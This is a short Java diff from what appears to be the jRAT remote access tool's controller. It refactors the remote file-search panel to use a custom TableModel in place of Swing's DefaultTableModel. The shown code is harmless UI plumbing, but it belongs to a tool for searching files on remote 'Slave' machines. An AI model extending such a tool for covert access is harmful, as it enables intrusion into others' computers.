@@ -20,12 +20,12 @@ import javax.swing.JTextField;
 import javax.swing.JToggleButton;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Drive;
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet53StartSearch;
 import se.jrat.controller.packets.outgoing.Packet54StopSearch;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.frames.FrameRemoteFiles;
 import se.jrat.controller.ui.renderers.JComboBoxIconRenderer;
@@ -37,14 +37,14 @@ public class PanelSearchFiles extends PanelControlParent {
 
 	private JTable table;
 
-	private DefaultTableModel model;
+	private TableModel model;
 	private JTextField txt;
 	private final ButtonGroup buttonGroup = new ButtonGroup();
 	private JComboBox<String> cbDrives;
 	private FileSearchTableRenderer renderer;
 	private FrameRemoteFiles parent;
 
-	public DefaultTableModel getModel() {
+	public TableModel getModel() {
 		return model;
 	}
 	
@@ -96,7 +96,7 @@ public class PanelSearchFiles extends PanelControlParent {
 		}
 
 		table = new DefaultJTable();
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Path", "Name" }));
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Path", "Name" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(392);
 		table.getColumnModel().getColumn(1).setPreferredWidth(178);
 		renderer = new FileSearchTableRenderer();
